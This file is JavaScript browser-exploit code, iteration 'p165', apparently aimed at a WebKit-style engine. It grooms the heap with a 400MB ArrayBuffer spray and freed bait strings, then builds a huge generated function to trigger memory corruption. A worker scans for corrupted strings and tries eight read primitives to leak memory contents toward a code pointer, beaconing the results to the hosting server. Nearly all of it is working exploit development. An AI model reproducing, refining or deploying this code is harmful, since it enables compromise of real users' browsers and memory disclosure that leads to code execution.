// p165 — Massive heap padding + multiple read primitives
//
// Problems solved:
//   1. p162/p164 crash at CALLING: spray 400MB of ArrayBuffers to map
//      pages around the metadata buffer so the 4.29GB sweep hits safe memory
//   2. p156 only reads 0x41: try every read method on corrupted strings,
//      not just charCodeAt. TextEncoder, concat, indexOf, structuredClone
//
// .length = 81400 IS already leaked data from metadata entries.
// We need more read primitives to extract the code pointer.
//
// Beacon prefix: V165-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V165-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // ── PHASE 0: HEAP PADDING ──
  // Spray 400MB of ArrayBuffers to map pages everywhere.
  // The sweep writes 4.29GB forward. If it hits unmapped memory it crashes.
  // Zeroed ArrayBuffers give safe landing zones.
  var pads = [];
  var PAD_COUNT = 400;
  var PAD_SIZE = 1048576; // 1MB each
  B('PAD-START');
  for (var p = 0; p < PAD_COUNT; p++) {
    try { pads.push(new ArrayBuffer(PAD_SIZE)); }
    catch(e) { B('PAD-OOM-' + p); break; }
  }
  B('PAD-DONE-' + pads.length + '-' + (pads.length) + 'MB');

  // ── WORKER ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V165-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');
        var found = false;
        var iters = 0;

        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              beacon('LEN-' + i + '-' + targets[i].length);
              found = true;
              break;
            }
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
        }

        // ── MULTI-READ: try every primitive on corrupted strings ──
        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          if (len === STR_LEN) continue;

          beacon('C' + i + '-len=' + len + '-hex=' + len.toString(16));

          // METHOD 1: charCodeAt scan (baseline, p156 got 0x41)
          if (len > 0 && len < 500000) {
            var cc = '';
            var scanMax = Math.min(len, 200);
            for (var b = 0; b < scanMax; b++) {
              try {
                var ch = targets[i].charCodeAt(b);
                if (ch !== CANARY) { cc += b + ':' + hx(ch) + ','; }
              } catch(e) { cc += b + ':ERR,'; break; }
            }
            beacon('M1-CC' + i + '-' + (cc || 'ALL41').substring(0, 200));
          }

          // METHOD 2: TextEncoder.encode
          try {
            var enc = new TextEncoder();
            var bytes = enc.encode(targets[i].substring(0, 64));
            var te = '';
            for (var b = 0; b < Math.min(bytes.length, 64); b++) {
              te += hx(bytes[b]);
            }
            beacon('M2-TE' + i + '-' + te.substring(0, 200));
          } catch(e) { beacon('M2-ERR' + i + '-' + (e.message || '').substring(0, 40)); }

          // METHOD 3: string concatenation (forces rope resolution)
          try {
            var cat = targets[i].substring(0, 32) + '';
            var catBytes = '';
            for (var b = 0; b < cat.length; b++) {
              catBytes += hx(cat.charCodeAt(b));
            }
            beacon('M3-CAT' + i + '-' + catBytes.substring(0, 200));
          } catch(e) { beacon('M3-ERR' + i + '-' + (e.message || '').substring(0, 40)); }

          // METHOD 4: indexOf (searches byte by byte differently)
          try {
            var nulPos = targets[i].indexOf('\x00');
            var ffPos = targets[i].indexOf('\xff');
            beacon('M4-IDX' + i + '-nul=' + nulPos + '-ff=' + ffPos);
          } catch(e) { beacon('M4-ERR' + i); }

          // METHOD 5: string comparison (triggers different read path)
          try {
            var sub16 = targets[i].substring(0, 16);
            var isAllA = (sub16 === 'AAAAAAAAAAAAAAAA');
            beacon('M5-CMP' + i + '-allA=' + isAllA + '-len16=' + sub16.length);
            if (!isAllA) {
              var cmpBytes = '';
              for (var b = 0; b < 16; b++) cmpBytes += hx(sub16.charCodeAt(b));
              beacon('M5-D' + i + '-' + cmpBytes);
            }
          } catch(e) { beacon('M5-ERR' + i + '-' + (e.message || '').substring(0, 40)); }

          // METHOD 6: structuredClone (deep copy through different internal path)
          try {
            var cloned = structuredClone(targets[i].substring(0, 64));
            var clBytes = '';
            for (var b = 0; b < Math.min(cloned.length, 64); b++) {
              clBytes += hx(cloned.charCodeAt(b));
            }
            beacon('M6-SC' + i + '-' + clBytes.substring(0, 200));
          } catch(e) { beacon('M6-ERR' + i + '-' + (e.message || '').substring(0, 40)); }

          // METHOD 7: read .length of multiple corrupted strings
          // Different strings get different entry data based on position
          var lens = '';
          for (var j = 0; j < targets.length; j++) {
            lens += j + ':' + targets[j].length + ',';
          }
          beacon('M7-LENS-' + lens.substring(0, 200));

          // METHOD 8: charCodeAt at entry structure offsets
          // If m_fiber points into an entry, offsets 24,64,68 relative to
          // the fake StringImpl would read non-zero entry fields
          if (len > 112) {
            var struct = '';
            var offsets = [0,4,8,12,16,20,24,28,32,48,56,64,68,72,80,96,104,108,112];
            for (var oi = 0; oi < offsets.length; oi++) {
              try {
                var v = targets[i].charCodeAt(offsets[oi]);
                struct += offsets[oi] + ':' + hx(v) + ',';
              } catch(e) { struct += offsets[oi] + ':ERR,'; }
            }
            beacon('M8-STRUCT' + i + '-' + struct.substring(0, 200));
          }

          // Only process first 3 corrupted strings
          if (i >= 2) break;
        }
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS ──
  var N_BAIT = 20;
  var STR_LEN = 100000;
  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 3: FREE BAITS + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD + CALL ──
  function phaseBuild() {
    B('BUILD-START');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v165fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v165ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v165ok ? 'OK' : 'FAIL'));
      if (!window.__v165fn) { B('NO-FN'); return; }

      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v165fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
